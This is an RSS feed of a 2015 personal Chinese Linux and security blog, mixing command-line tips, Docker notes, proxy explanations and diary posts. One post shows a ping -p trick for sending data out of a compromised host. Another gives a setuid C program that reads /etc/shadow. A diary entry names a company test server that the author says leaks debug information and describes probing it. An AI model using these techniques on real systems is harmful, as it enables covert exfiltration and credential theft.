<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>wrfly&#39;s blog</title>
    <link>https://wrfly.kfd.me/posts/2015/</link>
    <description>Recent content on wrfly&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 12 Dec 2015 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://wrfly.kfd.me/posts/2015/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>两个软件和一个rename</title>
      <link>https://wrfly.kfd.me/posts/%E4%B8%A4%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%92%8C%E4%B8%80%E4%B8%AArename/</link>
      <pubDate>Sat, 12 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E4%B8%A4%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%92%8C%E4%B8%80%E4%B8%AArename/</guid>
      <description>rename 先说rename 批量重命名的好东西，支持正则匹配，超级厉害。
做个测试：
for i in {1..9};do touch Hello-$i.txt;done
然后：
rename &amp;rsquo;s/(\w*-(\d+))/\2-\1/&amp;rsquo; *.txt
是不是很厉害～
lolcat &amp;amp; script 然后再说这两个好玩的软件
lolcat在ubunut上直接 apt-get install lolcat 就能用。为了保持神秘感，不上图了，只能告诉你它很酷炫～
然后再加一个function cat() { /bin/cat $@ | lolcat; } 这样就能让cat变成lolcat了～
script - 很神奇的命令录制软件
他不是屏幕录制，而是录制你的输入，通过生成的time文件和txt文件重放出来（scriptrepaly）
录制： script -t 2&amp;gt; script.time record.txt
重放： scriptreplay script.time record.txt
程序员是改变世界的人！</description>
    </item>
    
    <item>
      <title>Docker笔记</title>
      <link>https://wrfly.kfd.me/posts/docker%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 10 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/docker%E7%AC%94%E8%AE%B0/</guid>
      <description>From: https://www.gitbook.com/book/yeasy/docker_practice/details
BASIC Just some commands&amp;hellip;
sudo chmod +s /usr/bin/docker (give docker an &amp;rsquo;s&amp;rsquo;)
docker pull ubuntu (like git..)
docker run -idt &amp;ndash;hostname test &amp;ndash;name test ubuntu (a background ubuntu bash, use docker-enter to enter it or nsenter its pid)
docker rm (rm containers)
docker rm $(docker ps -a -q)
docker rmi (rm images)
From: https://raw.githubusercontent.com/yeasy/docker_practice/master/_local/.bashrc_docker
docker-enter container
docker run -d -p 5000:5000 registry
docker run -idt &amp;ndash;hostname test -v /opt/docker-share:/root/share ubuntu (When rm use docker rm -v xxx)</description>
    </item>
    
    <item>
      <title>linux-lcx</title>
      <link>https://wrfly.kfd.me/posts/linux-lcx/</link>
      <pubDate>Tue, 08 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/linux-lcx/</guid>
      <description>先po代码：
https://gist.github.com/wrfly/a55b11926e230e05a9a6
然后说用法：
➤ ./lcx Usage:./lcx -m method [host1] port1 [host2] port2 [-v] [-log filename] -v: version -m1: PORT1 HOST2 PORT2 -m2: PORT1 PORT2 -m3: HOST1 PORT1 HOST2 PORT2 -log: log the data For methods: -m1: listen on PORT1 and connect to HOST2:PORT2 -m2: listen on PORT1 and PORT2 -m3: connect to HOST1:PORT1 and HOST2:PORT2 粗略的解释下，希望对别人有帮助。
mode 1: 把本机的 port1 跟 host2 的 port2 连接起来(bind to connect)
➤ ./lcx -m1 8080 kfd.</description>
    </item>
    
    <item>
      <title>几个hack小技巧</title>
      <link>https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Sat, 05 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid>
      <description>ping  -p pattern You may specify up to 16 ``pad&amp;rdquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
 如果渗透到了一台机子却只能往外发ping怎么办？ -p 就可以搞定了。
举个例子
ping -c 1 -p `echo -n hello | xxd -ps` anoth_server 然后在another_server上面通过tcpdump就可以接收到hello。
$ tcpdump -i vboxnet0 -A tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on vboxnet0, link-type EN10MB (Ethernet), capture size 262144 bytes IP 192.</description>
    </item>
    
    <item>
      <title>20151125</title>
      <link>https://wrfly.kfd.me/posts/20151125/</link>
      <pubDate>Wed, 25 Nov 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/20151125/</guid>
      <description>乱七八糟的过完了这两个月。
时间都在忙活一个项目，只是不能告诉你这个项目是什么。
三千多个注册用户，八百多个使用用户，三百多个常用用户，以及三十多个在线用户。
不懂php，不懂python，唯一会的就是配服务器，然而还曾经被打死过。20M/s就挂了，弱爆了。
先是某个中午脑子里蹦出这个念头，再是域名注册，然后用Github的福利答了几台服务器，然后购买别家的服务器，然后更新服务端程序，然后更新博客，又添加了一些功能和在线支付，哦对，之前还开过淘宝店。上个周末又更新了主页，变成了高大上的风格。
嗯，还是不景气。
嗯，不知道现在该干啥了。
嗯，不会推广。
嗯，自己一个人。
中间夹杂了好多事儿，比如分手啊，比如复合啊，比如又分手啊。还参加了一次CTF决赛，拿了一千块的路费之后双十一挥霍买了Kindle然而也没看过几次……
时间过得好快。昨天刚买了回家的火车票。
折腾是为了啥呢？为了折腾。
那天晚上空虚的不行，想着，要不给移动硬盘装个系统吧，然后就动身了，到底也没装好，但是整个人立马就精神了许多。多动症。
那天晚上去了一次选修课，那老师说电脑内存至少要8G，最好是32G，要不玩不了。电脑音乐制作。吓得我决定下学期再选一门别的。
哦对了，昨天把我的个人信息卖给了趣分期，卖了20块，真后悔了，还不如去群里守着等红包呢。然后顺手测试了一波趣分期，发现了一个测试站，估计是蜜罐，对，绝对是，PHPdebug bar还在下面开着，哪有程序员这么二逼，各种路径，还有数据库的名字。apitest.qufenqi.com 不知道下次来看的时候这个站还有没有。
这个项目算是我最成功的一个了，啪，一共就三个。
还是败在了推广上面，当然，我自己也没激情了，其实还是不知道下一步要做什么了。也只好慢慢等，慢慢来。
那么问题来了，我都干了些啥呢？
书都是看了一半，过几天就要去还了。还有借的别人的Python的书，妈蛋我连看都没看啊，可耻！
这两个月茶也没怎么喝，幸亏保质期长，茶壶也不会生锈。
百无聊赖。
就这样吧。</description>
    </item>
    
    <item>
      <title>文件的s标志位</title>
      <link>https://wrfly.kfd.me/posts/%E6%96%87%E4%BB%B6%E7%9A%84s%E6%A0%87%E5%BF%97%E4%BD%8D/</link>
      <pubDate>Tue, 10 Nov 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E6%96%87%E4%BB%B6%E7%9A%84s%E6%A0%87%E5%BF%97%E4%BD%8D/</guid>
      <description>文件的S标志位 文件的 rwx 标志位，分别是 read，write，execute，用数字表示是 4,2,1.
那么文件的s标志位呢？
s标志位是 SET UID属性，指的是，这个文件在运行的时候会拥有文件所有者的权限，只要牵扯到权限这个词，那就好玩了。
S标志位的前提：文件必须是二进制可执行文件。
各种脚本是不行的，因为脚本中调用了其他的一些二进制程序，然而这些二进制程序并不具备S标志位，所以脚本的S标志位无效。
鸟哥的书上是用了 passwd 这个程序来说的，passwd的owner是root，而且passwd也具备s标志位，所以当你在运行passwd这个程序的时候就会拥有root的权限，这个root权限只是在当你运行passwd程序时所拥有的，不过，如果你要是能溢出passwd的话，你就可以提权了 ：）
做一个小测试： 普通用户是无法读取 /etc/shadow 这个文件的内容的，因为这个文件的权限是640，所有者是root，用户组是shadow，只有shadow用户组的人或者root用户才能够读取里面的内容。那么我们就来写个小程序毒一下里面的内容：
#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main(){ FILE *file; char ch; if( (file = fopen(&amp;#34;/etc/shadow&amp;#34;,&amp;#34;r&amp;#34;)) == NULL ){ printf(&amp;#34;Permission denied!\n&amp;#34;); exit(1); } ch = fgetc(file); while(ch != EOF){ putchar(ch); ch = fgetc(file); } fclose(file); getch() } gcc catshadwo.c -o catshadow
编译之后运行一下，如果不是root用户或者shadow用户组的人运行这个程序，就会提示不允许这样做。
那么我们把这个文件给root，然后再给他s标志位：
sudo chown root catshadow &amp;amp;&amp;amp; sudo chmod +s catshadow
OK，再来运行一下就可以读取shadow里面的内容了。</description>
    </item>
    
    <item>
      <title>接着上一篇</title>
      <link>https://wrfly.kfd.me/posts/%E6%8E%A5%E7%9D%80%E4%B8%8A%E4%B8%80%E7%AF%87/</link>
      <pubDate>Tue, 27 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E6%8E%A5%E7%9D%80%E4%B8%8A%E4%B8%80%E7%AF%87/</guid>
      <description>安装软件：  Kali套装 tree mtr nautilus-open-in-terminal indicator-multiload RedNoteBook stardict (and its icon, dictionary) Sublimetext Sougoupinyin UberWriter FocusWriter Chrome Firefox (Notice: Firefox won&amp;rsquo;t backup your bookmarks or so, it just sync your configs form one to another) Unity Tweak Tool Java Clementine # Music Virtual box VMware Thunder bird ( with all email accounts ) uGet htop most pv git python-pip curl tomate indicator-stickynotes  更改SWAP分区 添加或删除 默认有8G的swap分区，太大了，用不着，用 system-config-lvm 图形化管理器把lv减小，这软件很棒，不用敲命令，可视化的。 先把swap关闭 swapoff -a 然后重启，进入LiveCD模式。 把默认的swap分区删除，然后扩大主分区，再新建一个你想要的swap大小的lv，重启。</description>
    </item>
    
    <item>
      <title>Yep,installed my Ubnutu again</title>
      <link>https://wrfly.kfd.me/posts/yepinstalled-my-ubnutu-again/</link>
      <pubDate>Sun, 25 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/yepinstalled-my-ubnutu-again/</guid>
      <description>At first I have to say what I&amp;rsquo;m writing blow is all bull shit.
For these days I reinstall my Ubuntu, this is a sad story&amp;hellip;
The reason is that I made a mistake when I repartitioned the disk. At first I want to resize the EFI partition and the boot partition because the original EFI partition is too big for me(500M) and the boot partition is a little small(just 200M), you know it&amp;rsquo;s unreasonable, so I decided to resize it.</description>
    </item>
    
    <item>
      <title>20151007</title>
      <link>https://wrfly.kfd.me/posts/20151007/</link>
      <pubDate>Wed, 07 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/20151007/</guid>
      <description>一个月过去了，项目进展的也差不多。
一个多月以来，一个不会Python，不会PHP的人硬是改了PHP的网站和Python的程序，前几天还加了一个Bash的离线下载功能，真的，收获颇丰。
也没具体统计一共敲了多少命令，但我想，一万行总该是有的吧，毕竟6-7台服务器呢，还有那么多大大小小的功能，么么哒，亲自己一个～
做项目期间遇到了很多人，友善的，不友善的，可爱的，不可爱的，形形色色，乱七八糟。人跟人真的不一样，讲真。国人就喜欢免费，简单，一键安装，甚至都不想动脑子，乌合之众。这也就是那么多一键安装包的崛起，你甚至都不知道它在干什么，毕竟一键安装，而你也点了同意。好在我用Ubuntu。
我不知道我的项目能够活多久，但我希望他能够活很久。至少把前几天送礼物的钱给赚出来吧。累死累活一个多月，不求走上人生巅峰，23333.前些日子还打印了一千张广告，真，1000张。这种人生体验，没几个人能有的吧。爽！
忽然发现自己写的乱七八糟的，是不是因为我这几个月没有练字的缘故？
国庆七天又重新温习了一下哈利波特，从一个孩子变成了父亲。人世间那还能有比爱更强大的力量呢？可，什么又是爱呢？汤姆不知道，我也不知道。也没有比生死离别更能打动人的事了，可，生死离别之后还剩下什么呢？我才不相信什么活在我心中这样的鬼话。
乱七八糟的，又是乱七八糟的，根本写不出东西。也许脑子里根本就没有东西。
课也不想上，去tm的点名。明天继续翻译VIM tutorial好了，还有Linux 101 hacks。
随便写点东西证明我的存在，我活的很好，只是每天不知道吃啥。</description>
    </item>
    
    <item>
      <title>linux-101-hacks</title>
      <link>https://wrfly.kfd.me/posts/linux-101-hacks/</link>
      <pubDate>Thu, 24 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/linux-101-hacks/</guid>
      <description>Linux 101 hacks 翻译  ”There are only 10 types of people in the world — those who understand binary, those who don’t, and those who understand gray code” — Geek
 Author:Ramesh Natarajan 译者：wrfly From:www.thegeekstuff.com
 CDPATH  $ pwd /tmp $ cd mail -bash: cd: mail: No such file or directory [木有这个目录] $ export CDPATH=/etc # 或者直接 CDPATH=/etc $ cd mail /etc/mail [进去了!!!] $ pwd /etc/mail ps:CDPATH支持多个目录变量，比如，你可以CDPATH=$CDPATH:/home:/var/www:/etc:/opt，然后就可以切换到任意其中一个目录的子目录下，相当可爱～</description>
    </item>
    
    <item>
      <title>百度更懂中文？</title>
      <link>https://wrfly.kfd.me/posts/%E7%99%BE%E5%BA%A6%E6%9B%B4%E6%87%82%E4%B8%AD%E6%96%87/</link>
      <pubDate>Thu, 27 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E7%99%BE%E5%BA%A6%E6%9B%B4%E6%87%82%E4%B8%AD%E6%96%87/</guid>
      <description>windwos下mysql密码忘了，于是就用谷歌搜了一下，虽然输入错了，但是结果却令我大吃一惊。
对比下百度的结果，真是喜闻乐见了。</description>
    </item>
    
    <item>
      <title>SOCKS代理和HTTP代理的区别</title>
      <link>https://wrfly.kfd.me/posts/socks%E4%BB%A3%E7%90%86%E5%92%8Chttp%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/socks%E4%BB%A3%E7%90%86%E5%92%8Chttp%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>翻译自http://www.jguru.com/faq/view.jsp?EID=227532
括号里面都是我的注释，意会就好。
SOCKS代理 本地浏览器SOCKS服务器通常是用来做代理的，它通过TCP连接把目标主机和客户端连接在一起， 并转发所有的流量。SOCKS代理能在任何端口，任何协议下运行（额，好想有点不对， 这货是运行在session层，所以在他之下的层他就无法代理了）。SOCKS V4只支持 TCP连接，而SOCKS V5在其基础上增加了安全认证以及对UDP协议的支持（也就是说， SOCKS5支持密码认证以及转发UDP流量，注意，HTTP是不支持转发UDP的）。
SOCKS代理在任何情况下都不会中断server与client之间的数据（这是由这种协议的 特性决定的，毕竟非明文，但是在SOCKS代理服务器上还是可以还原出TCP和UDP的原始 流量的），当你的防火墙不允许你上网的时候，你就可以通过SOCKS代理来上网（这里的 意思是，如果GFW把google屏蔽了，你就可以通过一台海外的SOCKS代理服务器上谷歌）。
大多数的浏览器都支持SOCKS代理（这篇文章是三年前的，抱歉，谷歌第一条就是它）。（ 浏览器上网的时候需要与目标主机建立TCP连接，这个时候浏览器就会告诉SOCKS代理，它想 与目标主机进行通讯，然后SOCKS代理就会转发浏览器的数据，并向目标主机发出请求，然 后再把返回的数据转发回来。）（关于shadowsocks的一点题外话：虽然github上的源码 没了，但是耐不住民间私货多呀。shadowsocks有server端和client端，这两个都是用 来转发数据的，但是由于其所处的位置不同，所以功能也不同，client即本地运行的程序， 监听1080端口，并将数据转发到远在他乡的SOCKS服务器，由于这种转发是加密的，在会话层， 所以GFW过滤的难度很大，所以才派人巴拉巴拉让作者删除源码，嗯，一定是这样的。然后server 那边收到数据后，会原原本本的把数据再向目标请求，收到反馈后再返回给本地client的1080端口， 这样，我们向本地的1080请求资源，本地向SOCKS服务器请求资源，SOCKS服务器向目标请求资源， 这一条TCP连接就这样建立起来了。）但是，但是，但是，SOCKS代理原则上是可以还原真实数据的， 所以，第三方的代理也许不是很可靠。
（*原来还想画张图，画着画着实在太low了，果断Alt+F4*）
HTTP代理 HTTP代理跟上面原理类似，用处也基本相同，都是让处于防火墙下的主机与外界建立连接，但是它与SOCKS代理不同的是，HTTP代理可以中断连接（即在中间截断数据流），因为HTTP代理是以HTTP请求为基础的 而这些请求大多以明文形式存在，所以HTTP代理可以在Client和下游服务器中间窃听，修改数据。但也正 由于HTTP代理只能处理HTTP请求，所以它对HTTP请求的处理也是很舒服的（原文中是smart）。而也由于 HTTP代理可以获取你的HTTP请求，所以HTTP代理服务器那边就可以根据你提交的数据来把那些资源缓存下来，提升访问的速度（用户亲密度+1）。有好多ISP都用HTTP代理，而不管用户那边的浏览器是怎样配置的，因为不管用户们怎么配置，他们总是要访问80端口，而这些80端口们又掌握在ISP们的手中。（原文完全不是这样说的= =。原文是说，互联网提供商们把流量都通过了HTTP代理，这样代理服务器中就有了缓存，访问的速度会快一些。）
（我来举个栗子：假如你的HTTP代理是Goagent，监听本地127.0.0.1:8080，此刻假设你已经把浏览器 的代理设置为：127.0.0.1:8080，那么你在浏览器中，所有的POST，GET，以及其他的请求，都会通过 本地的代理转发给远程的服务器，然后再通过远程的服务器去请求你所请求的这些资源，大家知道，HTTP协议是通过明文传输的，无论是在本地还是远程的服务器上，都是可以监听到这些流量的，所以才会有GFW的存在……HTTP协议属于应用层，而SOCKS协议属于传输层，ps：传输层在网络层之下，这就决定了两者的能力大小。）
拓展阅读  http://man.chinaunix.net/develop/rfc/RFC1928.txt http://server.zdnet.com.cn/server/2009/0213/1342779.shtml http://www.blogjava.net/zyskm/archive/2013/03/01/395914.html http://baike.baidu.com/view/751.htm  tcpdump下观察SOCKS代理和HTTP代理 先来一张乱码压压惊：
上面这张图是我浏览谷歌主页的时候在wireshark里面监听到的内容，可以看到，乱码。我不知道是因为https的原因还是因为socks加密的原因，但是结果都一样，看不出这是啥内容。（但尽管如此，还是可以看到Google的，是吧）
这张，是我访问 kfd.me 主页的时候所产生的HTTP请求，可以看到，每次GET请求之前都会跟着一个socks的握手，这是因为我请求的是本地资源（在浏览器看来），要先通过SOCKS建立一条TCP连接，然后再通过这条连接产生HTTP请求，第一行，序号是103的数据包先向对方表明了自己的socks版本以及要访问目标的端口号，以此让远程服务器对自己进行认证并转发数据。细心的同学可能已经注意到，箭头的方向就是数据流的方向，在这里，56059是本地端口号，socks是本地代理，即1080端口。（当初设计这些协议的人真厉害啊！）
然后打开其中一个数据查看其详情，这个是第212个包，我们从下往上看（不是在楼梯从下往上看啊喂！），最下面那层，是HTTP协议，在往上，是SOCKS协议，这里可以更加直观的看到，HTTP是通过SOCKS进行的，再往上是传输层（TCP），再往上是互联网层（IPV4），再往上是链路层（ethernet，以太网），最上面是wireshark的frame协议。
再上面这一张是通过socks访问某个网站的数据流，好像是谷歌，我忘了。。中间还穿插着https这样的证书认证，hello完了才可以传输数据，也是蛮好玩的。
而这一张呢，是通过http代理获取一张图片的数据包，看他们的协议层就可以看出，HTTP直接通过TCP协议获取数据，而且HTTP协议又是明文传输的，所以……
下载查看数据流 这是我保存下来的整个过程，可以用sublimetext查看里面的内容，当然，有些东西是乱码也是正常的，但是提取出来就可以看到内容，因为这就是原始数据嘛。
如果想仔细观察这些数据包的话，你可以在安装了wireshark的情况下下载这些数据</description>
    </item>
    
    <item>
      <title>Oh-123</title>
      <link>https://wrfly.kfd.me/posts/oh-123/</link>
      <pubDate>Mon, 24 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/oh-123/</guid>
      <description>这几天乱七八糟的，乱七八糟的人，乱七八糟的培训。
安装DVWA啊，配置PHP啊，一天学会Python啊，21天当黑客啊…… 呵呵，太扯了。
唯一让我觉得不扯的事情就是昨天跟WSK和LCY出去吃饭。
还有我前几天开的那个 http://123.kfd.me
其实很早就想做一个导航类的网站了，暑假太懒，那天傍晚忽然又想起来了，于是乎，拖到了第二天，终于从lofter找到一个模板当背景，添加链接上去。
两年的收藏夹啊，一些资源网站，好玩的网站，有用的网站，偏僻的网站。配色有点暗，bigtang说我咋就这么喜欢黑色。嘿，我就喜欢了。
大部分是关于Linux的，有部分是关于hack（web penetration test）的，少部分是关于音乐视频的。Oh，这就是我的生活了。
昨天老胡说要交上周的报告，尼玛，啥报告啊，安装DVWA嘛，一天速成Python嘛，写个蛋啊。除了那个连接图片的还有点意思以外，别的我是真没兴趣（当然，也没做，也许还做不出来呢～），傲娇了。。
所以我决定还是自己搞PT吧，争取两天完成一个pentesterlab上的镜像，然后再把那三个vuln.OS搞一搞，暑假的那几天学了学metasploit，也没派上多大用场。
师父领进门，修行在个人。我tm连个师傅都没，要是自学成才了，那得戴一顶多大的帽子。
嗯，就酱吧。</description>
    </item>
    
    <item>
      <title>如何背程序</title>
      <link>https://wrfly.kfd.me/posts/%E5%A6%82%E4%BD%95%E8%83%8C%E7%A8%8B%E5%BA%8F/</link>
      <pubDate>Tue, 18 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E5%A6%82%E4%BD%95%E8%83%8C%E7%A8%8B%E5%BA%8F/</guid>
      <description>今天看慕课网的时候，看到关于编程思想的这一部分， 然后就看到Tony老师说如何“背”程序：
 抄写老师的程序并能正确运行。 为程序补全注释 删掉注释，为代码重新加注释 看注释写代码 删掉代码和注释，从头开始写  个人感觉还是很有道理的。
毕竟，一段代码吃不透，下次再吃的时候，就会消化不良，就会拉肚子。
&amp;ldquo;21天黑客速成&amp;rdquo;之类的东西还是少看。
不花费大量的时间就想掌握一门技能，痴人说梦。</description>
    </item>
    
    <item>
      <title>fuser命令和lsof命令</title>
      <link>https://wrfly.kfd.me/posts/fuser%E5%91%BD%E4%BB%A4%E5%92%8Clsof%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Sat, 08 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/fuser%E5%91%BD%E4%BB%A4%E5%92%8Clsof%E5%91%BD%E4%BB%A4/</guid>
      <description>引子 前几天重装metasploit的时候，有几个端口一直被占用，记得以前有个命令是 可以根据端口号来确定进程号的，搜了一下，原来是fuser命令。
fuser - identify processes using files or sockets.
根据占用的文件或者socket来确定进程。好东西啊。
fuser-几个常用的命令  fuser 8080/tcp 打印占用8080端口的进程 fuser /etc/passwd 打印占用/etc/passwd的进程 fuser -k 8080/tcp 杀死占用8080端口的进程  下面是来自thegeekstuff的关于fuser的一些介绍和技巧。To share and mark.
文件或目录 $fuser . /home/mr/test: 13965c 可以看到进程ID后面跟了一个字母&amp;rsquo;c&amp;rsquo;，这个&amp;rsquo;c&amp;rsquo;其实是一个标识符，表示 这个进程把此目录作为他的当前目录。类似的还有：
   参数 意义     c 当前目录   e 可执行文件正在运行   f 进程正在打开文件，默认省略   F 进程正在打开文件往里写入，默认省略   r 进程的根目录   m 内存映射，或者共享库    具体可以加上-v查看ACCESS详情，但是我感觉用处不大。另外-v还可以查看运行进程的用户是谁，运行的命令是什么， 这个还是很有用的。</description>
    </item>
    
    <item>
      <title>聊一聊转码</title>
      <link>https://wrfly.kfd.me/posts/%E8%81%8A%E4%B8%80%E8%81%8A%E8%BD%AC%E7%A0%81/</link>
      <pubDate>Tue, 04 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E8%81%8A%E4%B8%80%E8%81%8A%E8%BD%AC%E7%A0%81/</guid>
      <description>iconv 要上密码学了，但是老师发的字幕在我的电脑上有点小问题，因为他们的编码格式是GBK编码 （Windows系统），而我的系统默认的编码是UTF-8，所以会造成有些应用打开的时候出现乱码， 或者干脆啥也没有。
附上两个维基链接：
GBK 编码 https://en.wikipedia.org/wiki/GBK
UTF-8编码 https://en.wikipedia.org/wiki/UTF-8
简而言之，gbk是国产的编码格式，UTF-8是国际化的编码格式。
这就造成了我学习上的一些困扰，那么，该怎样解决这个问题呢？
接下来就请出这篇文章的主角: iconv
简单翻译一下iconv的man手册：
 iconv - 把文字从一种格式转换成另一种格式。 如果没有给定输入文件的话，就从标准输入中读取， 如果没有给定输出文件的话，就将转换结果输出到标准输出当中。 默认的编码都是系统的本地默认编码。
iconv [options] [-f from-encoding] [-t to-encoding] [inputfile]&amp;hellip;
相关选项： * -f from-encoding (输入的编码格式，如 -f gbk) * -t to-encoding (输出的编码格式，如 -t utf8)
如果 **//IGNORE** 跟在输出编码格式后面的话，不能正确转换的文字将会被抛弃，并且转换完成之后 将会打印出错误信息。（PS：不能正确转换的意思是，字符集里没有这个字，也包括那些生僻字哦～也就是说，如果这个编码能够被转换成乱七八糟的生僻字， 那么iconv是可以转换的，因为它“认识”这些生僻字，尽管你不认识。） 如果 **//TRANSLIT** 跟在输出编码后面的话，如果需要并且可能的话，源编码将会被音译为要转换的编码。 这就意味着，如果一个单词不能背转换为相应编码的时候，就会被读音相似，也可以说是拼写相似的单词所代替， 既不能被正确转换，也不能被音译的文字将会以 &amp;ldquo;?&amp;rdquo; 表示。 * -l 列出所有已知编码类型 * -c 丢弃那些不能背正确转换的编码，而不是遇到错误时停止。 * -o 后面跟着要输出的文件，例如 -o output.file * &amp;ndash;verbose 当处理多个文件时，打印进度信息到标准错误中。 * -?</description>
    </item>
    
    <item>
      <title>懒</title>
      <link>https://wrfly.kfd.me/posts/%E6%87%92/</link>
      <pubDate>Wed, 22 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E6%87%92/</guid>
      <description>还是自己懒。
临近期末了还不好好预习，连挣扎都不舍得挣扎一下。
不想学那些没用的东西，不好玩，没意思。所以就把懒当做借口，把“学了没用”作为挡箭牌了。
别人问我，你不学习你都干啥了，我支支吾吾答不上来。因为我也不知道自己干啥了，没有看书，没有写代码，没有搭建啥服务，也没有看电影。
前几天看美剧，但是毕竟还看了点书，尽管我知道看完之后并没有什么卵用。Both books and movies.
现在想想，到底什么有用呢？或许什么都没有用，什么都有用。想当年……学了那么多乱七八糟的都不如多跟，自己也没吐过一句槽。根茎叶花果种子……有个鸟用。都不如多跟人聊聊天，还能练练打字，以后敲代码也娴熟。
真的是这样吗？
我一直拿“学了没用”和“根本不感兴趣”来敷衍，因为我没有别的话可说了，因为我整个学期都没听过几次课，因为我没学这些东西，因为我没付出。所以，雪崩一旦开始就再也停不下来了。凭啥，凭啥挂科？就凭这个。
但是好在我看开了，破罐子破摔的话，我也碎掉了～哈哈哈。
这样也就没负担了，就像那些亡命之徒，早晚都是死，拉几个垫背的？
早晚都毕不了业，干嘛不干点好玩的？
于是乎，所以。
并没有忘记自己的初心，也许我写不出windows这样的系统了，但是这也并不妨碍我成为一个hacker的计划。 要学的东西好多好多，时间是个大问题，我相信自己会有一个好的前程，毕竟……，是吧。
多写代码少说话。
本来嘛，大学就不是为了混毕业证的，拿了一纸文凭，还不是出来干活。啥？不会写代码？出去。
所以这个毕业证我是不抱有太大希望了。嗯……要是老师开恩给个60，那我也不反对～
懒。
懒得字都不想打，书都不想翻，视频也懒得看，饭也懒得吃，算了，我还是去圈里呆着吧。
宿舍里也乱七八糟的，只好带上耳机听音乐。
写的也乱七八糟的，只好留给自己看。
多年后再回首：“卧槽我当年期末的时候还这么懒。” 嗯，不错。</description>
    </item>
    
    <item>
      <title>Bash and NC chat room</title>
      <link>https://wrfly.kfd.me/posts/bash-and-nc-chat-room/</link>
      <pubDate>Tue, 07 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/bash-and-nc-chat-room/</guid>
      <description>代码 https://gist.github.com/wrfly/3cafd411dc42822a9b16
效果 ![nchat-1/img/nchat/1.png)
![nchat-2/img/nchat/2.png)
![nchat-3/img/nchat/3.png)
介绍 一开始是为了计算机网络的大作业，说是要写一个聊天软件，要用socket，但是我C学的不好，觉得要是让我写C代码，至少得一周才能吃透，所以就想了个懒办法，Bash和Ncat。
一开始的思路是让nc建立连接，通过echo输出，read读取，但是这样只能局限于NC那个界面，而且用户之间并没有标识，negative。
期间接触了一点点bash网络编程的相关知识，比如exec 3&amp;lt;&amp;gt; /dev/tcp/127.0.0.1/80和echo &amp;quot;balabala&amp;quot; 1&amp;gt;&amp;amp;3和cat &amp;lt;&amp;amp;3
A$ ncat -lp 8080 B$ exec 3&amp;lt;&amp;gt; /dev/tcp/127.0.0.1/80 B$ echo &amp;#34;balabala&amp;#34; 1&amp;gt;&amp;amp;3 B$ cat &amp;lt;&amp;amp;3 通过这种方式来绑定端口或者向端口IO
信息加密解密方法：
en(){ echo $1|openssl aes-256-cbc -k pass -e |openssl aes-256-cbc -k pass -d; } 这个小函数是用来测试加密解密的。
然后说下脚本的思路：
 登陆，确定用户身份，用户名长度要过滤，防止恶意输入 房间选择，也要过滤，因为是要创建一个新的文档，所以必须过滤掉&amp;rdquo;. / \&amp;ldquo;等一系列特殊字符，默认是public房间，即所有用户输入输出均在public文件中。 消息IO，这个是聊天的核心，但是实现起来并不是很难，tail -f一直检测文件变化，因为所有的用户输入都保存到了“chat_room”这个文件里，当有新用户发言的时候所有同一房间下的用户都会收到消息，相当于群聊。如果是想两个人聊天，就可以两个人新建一个聊天室，也就相当于一对一的聊天了。 数据包格式，这个好弄，时间，用户名，消息数据。 安全性。远程的安全性永远的不到保障，所以只能在客户端解决。Wait~ 扩展：文件传输，表情包，tmux扩展，发送图片（asciiview）  问题  进程间通信，用tail读取文件 父进程退出之后，子进程不退出（tail -f &amp;ndash;pid $$） kill 命令用法 命令行输出颜色 （echo -e &amp;ldquo;balabala&amp;rdquo;） $$ 和 $!</description>
    </item>
    
    <item>
      <title>stardict&#39;s icon</title>
      <link>https://wrfly.kfd.me/posts/stardicts-icon/</link>
      <pubDate>Sun, 14 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/stardicts-icon/</guid>
      <description>Boys and girls~
由于stardict的图标是png格式的，放大之后那个锯齿哟……所以我就自己画了一个～
